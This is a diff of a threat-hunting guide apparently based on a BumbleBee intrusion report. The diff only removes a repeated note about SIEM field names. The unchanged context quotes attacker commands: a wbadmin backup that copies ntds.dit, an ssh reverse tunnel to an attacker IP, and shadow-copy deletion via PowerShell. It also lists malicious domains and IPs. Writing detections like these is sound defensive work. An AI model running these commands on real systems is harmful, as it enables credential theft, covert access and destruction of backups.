@@ -57,7 +57,6 @@ Specific binaries of interest from this report:
 - `consent.exe` executing outside of `C:\Windows\System32\`
 - `WAB.exe` or renamed variants executing from `%APPDATA%` — note that `wab.exe` is a legitimate Windows Address Book binary whose normal execution path is `Program Files\Windows Mail`, not System32. Detections should exclude `Program Files\Windows Mail` and `WinSxS` as known legitimate locations rather than System32
 
-NOTE: Field names may need to be adjusted based on your log source and SIEM configuration.
 
 ---
 
@@ -75,7 +74,6 @@ wbadmin.exe start backup -backuptarget:\\127.0.0.1\C$\ProgramData\ -include:C:\w
 
 Search for wbadmin.exe process creation events where the command line contains `ntds.dit` or `start backup`.
 
-NOTE: Field names may need to be adjusted based on your log source and SIEM configuration.
 
 ---
 
@@ -91,7 +89,6 @@ ssh user@193.242.184[.]150 -R *:10400 -p22
 
 Hunt for ssh.exe process creation events where the command line contains the `-R` flag indicating a reverse port forward.
 
-NOTE: Field names may need to be adjusted based on your log source and SIEM configuration.
 
 ---
 
@@ -107,7 +104,6 @@ powershell.exe -Command "Get-WmiObject Win32_Shadowcopy | Remove-WmiObject"
 
 Hunt for PowerShell process creation events containing `Win32_Shadowcopy` and `Remove-WmiObject`.
 
-NOTE: Field names may need to be adjusted based on your log source and SIEM configuration.
 
 ---
 
@@ -122,7 +118,6 @@ Specific indicators from this report:
 - `FileZilla_3.68.1_win64_sponsored2-setup.exe` executed from `C:\ProgramData\`
 - Outbound connections to `185.174.100[.]203` on port 22
 
-NOTE: Field names may need to be adjusted based on your log source and SIEM configuration.
 
 ---
 
@@ -148,7 +143,6 @@ Known BumbleBee domains from this report:
 - `ks501oz9nm3v05[.]org`
 - `v5rjsdqogstopr[.]org`
 
-NOTE: Field names may need to be adjusted based on your log source and SIEM configuration.
 
 ---
 
@@ -167,7 +161,6 @@ Known IPs from this report:
 - `193.242.184.150` — Reverse SSH Tunnel
 - `185.174.100.203` — Exfiltration Server
 
-NOTE: Field names may need to be adjusted based on your log source and SIEM configuration.
 
 ---
 
